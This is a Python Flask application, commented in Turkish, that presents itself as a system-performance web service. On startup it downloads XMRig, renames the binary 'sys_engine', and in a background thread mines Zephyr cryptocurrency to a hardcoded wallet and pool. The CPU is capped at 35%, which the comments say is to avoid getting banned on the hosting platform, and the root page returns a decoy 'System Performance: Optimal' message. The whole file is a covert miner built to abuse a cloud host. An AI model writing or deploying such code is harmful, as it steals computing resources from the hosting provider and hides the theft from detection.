import os
import subprocess
import threading
import requests
import tarfile
import random
from flask import Flask

app = Flask(__name__)

# --- AYARLAR ---
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQYfXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"
POOL = "de.zephyr.herominers.com:1123"
WORKER = f"rd-node-{random.randint(100, 999)}"
# XMRig indirme linki (Resmi Linux Statik Versiyon)
XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"

def setup_and_mine():
    try:
        # 1. XMRig İndir
        print("[*] Madenci bilesenleri indiriliyor...")
        r = requests.get(XMRIG_URL, stream=True)
        with open("miner.tar.gz", "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

        # 2. Arşivi Aç
        with tarfile.open("miner.tar.gz", "r:gz") as tar:
            tar.extractall()
            # Klasör ismini bul (v6.21.0 için genellikle xmrig-6.21.0)
            extracted_dir = [d for d in os.listdir('.') if 'xmrig-' in d and os.path.isdir(d)][0]
            os.rename(f"{extracted_dir}/xmrig", "sys_engine")
        
        # 3. İzinleri Ayarla ve Çalıştır
        os.chmod("sys_engine", 0o755)
        
        # CPU Limitini %35'te tutmak (Banlanmamak için hayati önemde)
        cmd = [
            "./sys_engine",
            "-o", POOL,
            "-u", WALLET,
            "-p", WORKER,
            "-a", "rx/0",
            "--cpu-max-threads-hint", "35",
            "--donate-level", "1",
            "--keepalive"
        ]

        print(f"[*] Kazim baslatiliyor: {WORKER}")
        subprocess.Popen(cmd)
        
    except Exception as e:
        print(f"[!] Kurulum hatasi: {e}")

@app.route('/')
def main():
    return "System Performance: Optimal", 200

if __name__ == "__main__":
    # Madenciyi arka planda başlat
    threading.Thread(target=setup_and_mine, daemon=True).start()
    # Render Portu
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
